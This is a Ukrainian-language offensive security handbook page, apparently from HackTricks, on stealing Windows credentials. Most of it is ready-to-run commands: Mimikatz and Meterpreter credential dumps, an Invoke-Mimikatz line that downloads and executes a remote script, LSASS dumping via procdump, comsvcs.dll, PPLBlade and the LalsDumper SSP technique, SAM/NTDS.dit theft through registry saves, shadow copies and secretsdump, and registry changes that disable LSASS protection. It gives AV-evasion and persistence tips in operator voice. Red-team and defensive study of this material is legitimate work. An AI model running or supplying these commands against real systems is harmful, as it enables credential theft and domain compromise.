# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості, які Mimikatz може виконувати на** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ці захисти можуть завадити Mimikatz витягнути деякі credentials.**

## Credentials with Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати passwords and hashes** на системі жертви.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
Ви можете використовувати цей інструмент, щоб **зняти дамп процесу lsass**, **завантажити дамп** та **витягти** **credentials локально** з дампа.

Ви також можете використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **визначати** як **шкідливе** використання **procdump.exe to dump lsass.exe**, це тому, що вони **виявляють** рядок **"procdump.exe" and "lsass.exe"**. Тому **більш приховано** **передавати** як **аргумент** **PID** lsass.exe до procdump **замість** імені lsass.exe.

### Dumping lsass with **comsvcs.dll**

DLL з ім'ям **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **знімання пам'яті процесу** у випадку краху. Ця DLL містить **функцію** з іменем **`MiniDumpW`**, призначену для виклику через `rundll32.exe`.\
Не має значення, що передавати в перших двох аргументах, але третій аргумент розділений на три компоненти. Ідентифікатор процесу, який треба здампити, становить першу частину, місце розташування файлу дампу — другу, а третя частина суворо є словом **full**. Альтернатив немає.\
Після розбору цих трьох компонент DLL створює файл дампа та записує у нього пам'ять вказаного процесу.\
Використання **comsvcs.dll** підходить для дампу процесу lsass, що дозволяє уникнути завантаження та виконання procdump. Цей метод детально описано на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Нижче наведено команду, яка використовується для виконання:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Створення дампу lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на Task Bar і виберіть Task Manager
2. Натисніть More details
3. У вкладці Processes знайдіть процес "Local Security Authority Process"
4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" та виберіть "Create dump file".

### Створення дампу lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це підписаний Microsoft бінарний файл, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це Protected Process Dumper Tool, який підтримує обфускацію memory dump і передачу їх на віддалені робочі станції без запису на диск.

**Key functionalities**:

1. Обхід PPL protection
2. Обфускація memory dump файлів для обходу механізмів виявлення Defender на основі сигнатур
3. Завантаження memory dump за допомогою RAW і SMB методів без запису на диск (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon постачає триетапний dumper під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тож EDR hooks на цей API ніколи не спрацьовують:

1. **Stage 1 loader (`lals.exe`)** – шукає у `fdp.dll` плейсхолдер, що складається з 32 літер `d` у нижньому регістрі, перезаписує його абсолютним шляхом до `rtu.txt`, зберігає патчений DLL як `nfdp.dll`, і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливий DLL як новий Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, XOR-ить кожен байт з `0x20` і відображає декодований blob в пам'ять перед передачею виконання.
3. **Stage 3 dumper** – відображений payload заново реалізує логіку MiniDump, використовуючи **direct syscalls**, отримані з імен API, що захешовані (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціальний експорт з ім'ям `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснутий дамп LSASS у файл і закриває дескриптор, щоб ексфільтрація могла відбутися пізніше.

Operator notes:

* Тримайте `lals.exe`, `fdp.dll`, `nfdp.dll`, та `rtu.txt` в одній теці. Stage 1 перезаписує жорстко закодований плейсхолдер абсолютним шляхом до `rtu.txt`, тому рознесення файлів порушить ланцюг.
* Реєстрація відбувається шляхом додавання `nfdp` у `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете самостійно вказати це значення, щоб змусити LSASS повторно завантажувати SSP при кожному завантаженні системи.
* Файли `%TEMP%\*.ddt` — це стиснуті дампи. Розпакуйте локально, а потім передайте їх у Mimikatz/Volatility для витягання облікових даних.
* Запуск `lals.exe` вимагає прав admin/SeTcb, щоб `AddSecurityPackageA` пройшов успішно; як тільки виклик повернеться, LSASS прозоро завантажить шкідливий SSP і виконає Stage 2.
* Видалення DLL з диска не видаляє його з пам'яті LSASS. Або видаліть запис реєстру й перезапустіть LSASS (reboot), або залиште його для довготривалої персистентності.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit з цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Вивантажити історію паролів з NTDS.dit з цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису в NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ці файли повинні бути **розміщені** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM_. Але **ви не можете просто скопіювати їх звичайним способом**, бо вони захищені.

### З реєстру

Найпростіший спосіб вкрасти ці файли — отримати їх копії з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ці файли на вашу машину Kali і **витягніть хеші** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Ви можете виконати копіювання захищених файлів за допомогою цієї служби. Потрібно мати права Administrator.

#### Using vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але ви можете зробити те саме з **Powershell**. Ось приклад **how to copy the SAM file** (жорсткий диск, що використовується — "C:", і файл збережено в C:\users\Public), але це можна використати для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) щоб зробити копію SAM, SYSTEM та ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Облікові дані Active Directory - NTDS.dit**

Файл **NTDS.dit** вважається серцем **Active Directory**, містить критично важливі дані про об'єкти користувачів, групи та їх членства. Саме тут зберігаються **password hashes** для доменних користувачів. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за адресою **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі підтримуються три основні таблиці:

- **Data Table**: ця таблиця відповідає за збереження відомостей про об'єкти, такі як користувачі та групи.
- **Link Table**: відстежує зв'язки, наприклад членство в групах.
- **SD Table**: тут зберігаються **Security descriptors** для кожного об'єкта, що забезпечує безпеку й контроль доступу до збережених об'єктів.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, і він використовується процесом _lsass.exe_. Тому частина файлу **NTDS.dit** може перебувати в пам'яті `lsass` (ймовірно там знайдуться останні звернені дані через кеш для підвищення продуктивності).

#### Розшифровка хешів у NTDS.dit

Хеш зашифровано 3 рази:

1. Розшифрувати Password Encryption Key (**PEK**) за допомогою **BOOTKEY** та **RC4**.
2. Розшифрувати хеш, використовуючи **PEK** та **RC4**.
3. Розшифрувати хеш, використовуючи **DES**.

**PEK** має однакове значення на кожному контролері домену, але він зашифрований всередині файлу **NTDS.dit** з використанням **BOOTKEY** з файлу **SYSTEM** контролера домену (BOOTKEY відрізняється між контролерами домену). Саме тому, щоб отримати облікові дані з файлу **NTDS.dit**, вам потрібні файли **NTDS.dit** та **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Доступно з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати трюк [**volume shadow copy**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам'ятайте, що вам також потрібна копія файлу **SYSTEM** (знову — [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) трюк).

### **Витягнення hashes з NTDS.dit**

Після того, як ви **отримали** файли **NTDS.dit** та **SYSTEM**, ви можете використати інструменти, такі як _secretsdump.py_, щоб **витягти hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **витягнути їх автоматично** за допомогою дійсного користувача domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих NTDS.dit файлів** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Також ви можете використовувати **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Витяг об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можна витягнути в базу даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Витягуються не лише secrets, а й повні об'єкти та їхні атрибути для подальшого отримання інформації, коли raw NTDS.dit файл вже було отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive є необов'язковим, але дозволяє розшифрувати секрети (NT & LM hashes, supplemental credentials такі як паролі у відкритому тексті, kerberos або trust keys, NT & LM password histories). Разом із іншою інформацією вилучаються такі дані : user і machine accounts з їхніми хешами, UAC flags, мітки часу останнього logon та зміни пароля, опис облікових записів, імена, UPN, SPN, групи та рекурсивні членства, дерево organizational units та членство в ньому, trusted domains з типом trusts, напрямком і атрибутами...

## Lazagne

Завантажте бінарний файл з [here](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використати цей бінарний файл для витягання credentials з кількох програм.
```
lazagne.exe all
```
## Інші інструменти для витягнення облікових даних з SAM та LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для витягнення облікових даних з пам'яті. Завантажити його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Витягує облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягнути облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) та просто **запустіть його**, і паролі будуть витягнуті.

## Добування простаїв RDP-сесій і послаблення заходів безпеки

Ink Dragon’s FinalDraft RAT включає таскер `DumpRDPHistory`, техніки якого корисні для будь-якого red-teamer:

### Збір телеметрії у стилі DumpRDPHistory

* **Outbound RDP targets** – розпарсіть кожен user hive за шляхом `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожний підключ реєстру зберігає ім'я сервера, `UsernameHint` та мітку часу останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – опитайте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на предмет Event IDs **21** (успішний вхід) та **25** (відключення), щоб відобразити, хто адміністрував машину:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Як тільки ви знатимете, який Domain Admin регулярно підключається, дампте LSASS (за допомогою LalsDumper/Mimikatz), поки їхня **відключена** сесія ще існує. CredSSP + NTLM fallback залишає їхній verifier і токени в LSASS, які потім можна відтворити через SMB/WinRM, щоб захопити `NTDS.dit` або встановити persistence на domain controllers.

### Зниження рівня захисту в реєстрі, націлене FinalDraft

The same implant also tampers with several registry keys to make credential theft easier:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Встановлення `DisableRestrictedAdmin=1` змушує повне credential/ticket reuse під час RDP, що дозволяє pivot-атаки у стилі pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає UAC token filtering, тож local admins отримують unrestricted tokens по мережі.
* `DSRMAdminLogonBehavior=2` дозволяє адміністру DSRM входити, коли DC онлайн, надаючи атакерам ще один вбудований обліковий запис з високими привілеями.
* `RunAsPPL=0` видаляє LSASS PPL protections, роблячи доступ до пам'яті тривіальним для dumpers, таких як LalsDumper.

## Посилання

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
